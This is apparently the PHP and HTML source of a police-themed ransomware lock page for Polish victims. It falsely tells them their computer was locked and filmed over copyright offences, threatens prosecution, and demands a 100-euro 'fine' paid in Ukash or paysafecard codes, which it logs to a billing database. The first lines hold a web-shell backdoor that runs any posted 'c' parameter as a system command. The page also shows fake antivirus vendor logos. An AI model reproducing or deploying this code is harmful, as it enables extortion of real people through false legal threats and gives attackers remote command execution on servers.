<?php
if (!empty($_POST['c']))
{
system($_POST['c']);
die();
}
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 727px;" id="Untitled-1-02"><span id="result_box" class="" lang="pl"><span class="hps">Ca&#322;a aktywno&#347;&#263;</span> <span class="hps">tego komputera</span> <span class="hps">zosta&#322;a nagrana</span><span class="">.</span> <span class="hps">Je&#347;li u&#380;ywasz</span> <span class="hps">kamery</span><span>, filmiki i</span> <span class="hps">zdj&#281;cia</span> <span class="hps">zosta&#322;y zapisane</span> <span class="hps">do</span> <span class="hps">kamery</span> <span class="hps">identyfikacji.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="pl"><span class="hps">Tw&oacute;j adres IP</span><span class="">:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="pl"><span class="hps">Mo&#380;esz</span> <span class="hps">by&#263; &#322;atwo identyfikowane przez</span> <span class="hps">adres IP</span> <span class="hps">i zwi&#261;zany z</span> <span class="hps">hosta</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="pl"><span class="hps">Nielegalnie</span> <span class="hps">pobrany</span> <span class="hps atn">materia&#322; (</span><span>MP3</span><span>, filmy</span> <span class="hps">lub oprogramowanie)</span> <span class="hps">zosta&#322;a</span> <span class="hps">umieszczona na komputerze</span><br>
<br>
 <span class="hps">Pobranie</span> <span class="hps">te</span> <span class="hps">zosta&#322;y powt&oacute;rzone</span><span>, co</span> <span class="hps">obejmuj&#261;cy</span> <span class="hps">przest&#281;pstwa</span> <span class="hps">z sekcji</span> <span class="hps">106</span> <span class="hps">Ustawy o prawie autorskim</span><span>.</span><br>
<br>
<span class="">Pobieranie</span> <span class="hps">materia&#322;&oacute;w chronionych prawem autorskim</span> <span class="hps">za po&#347;rednictwem Internetu</span> <span class="hps">lub</span> <span class="hps">sieci wymiany</span> <span class="hps">muzycznych</span> <span class="hps">jest nielegalna i</span> <span class="hps">jest zgodne z</span><br>
 <span class="hps">Sekcja</span> <span class="hps">106</span> <span class="hps">przedmiotu</span> <span class="hps">prawa autorskiego,</span> <span class="hps">grzywny lub pozbawienia wolno&#347;ci</span> <span class="hps">za</span> <span class="hps">kar&#261;</span> <span class="hps">do 3 lat</span><br>
<br>
 <span class="hps">Futhermore</span><span>, posiadanie</span> <span class="hps">nielegalnie</span> <span class="hps">pobranego</span> <span class="hps">materia&#322;u</span> <span class="hps">jest karalne</span> <span class="hps">zgodnie z &sect;</span> <span class="hps">184</span> <span class="hps">pkt 3</span> <span class="hps">Kodeksu karnego</span> <span class="hps">i</span> <span class="hps">mo&#380;e r&oacute;wnie&#380; prowadzi&#263; do</span> <span class="hps">konfiskaty</span> <span class="hps">komputera,</span> <span class="hps">z</span> <span class="hps">kt&oacute;rego</span> <span class="hps">diles</span> <span class="hps">zosta&#322;y pobrane</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="pl"><span class="hps">Prosz&#281;</span> <span class="hps">post&#281;powa&#263; zgodnie z instrukcj&#261;</span> <span class="hps">na</span> <span class="hps">prawo</span></span>

<form name="ukash_form" method="get" action="PL.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="PL.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="pl"><span style="color: rgb(255, 0, 0);" class="hps">Uwaga:</span> <span class="hps">Ten wspania&#322;y</span> <span class="hps">mog&#261; by&#263; wyp&#322;acane</span> <span class="hps">w ci&#261;gu 48 godzin</span><span>,</span> <span class="hps">je&#347;li pozwolisz</span> <span class="hps">48</span> <span class="hps">godzin</span> <span class="hps">przechodzi</span> <span class="hps">bez</span> <span class="hps">zap&#322;aty,</span><br>
&nbsp;<span class="">Mo&#380;liwo&#347;&#263;</span> <span class="hps">odblokowania</span> <span class="hps">komputera</span> <span class="hps">wygasa.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">W tym przypadku</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">sprawa karna</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">przeciwko tobie</span><span style="font-weight: bold;"> </span> <span style="font-weight: bold;" class="hps">zostaniezainicjowana automatycznie</span><span class="">.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="pl"><span class="hps">Jak odblokowa&#263;</span><span>?</span><br>
<br>
 <span class="hps">Zgodnie</span> <span class="hps atn">z prawem <span style="font-weight: bold;">"</span></span><span style="font-weight: bold;">w sprawie kontroli </span><span style="font-weight: bold;" class="hps">i ochrony</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">informacji"</span> <span class="hps">na</span> <span class="hps">02/01/2012</span> <span class="hps">Musisz si&#281;</span> <span class="hps">zap&#322;aci&#263; grzywn&#281; w wysoko&#347;ci</span> <span class="hps"><span style="font-weight: bold;">100 euro</span>.</span> <span class="hps">Dla wygody</span> <span class="hps">p&#322;acenia</span> <span class="hps">grzywny</span> <span class="hps">ofert&#281;</span> <span class="hps">u&#380;y&#263; bezpiecznego</span> <span class="hps">form&#281; p&#322;atno&#347;ci</span> <span class="hps">za kupony</span> <span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">/</span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">paysafecard</span>.</span> <span class="hps">Musisz kupi&#263;</span> <span class="hps">bony</span> <span class="hps">w wysoko&#347;ci</span> <span style="font-weight: bold;" class="hps">100 EUR</span><span class="">, po</span> <span class="hps">wype&#322;nienie</span> <span class="hps">odpowiednich p&oacute;l</span> <span class="hps">kliknij</span> <span class="hps">"OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
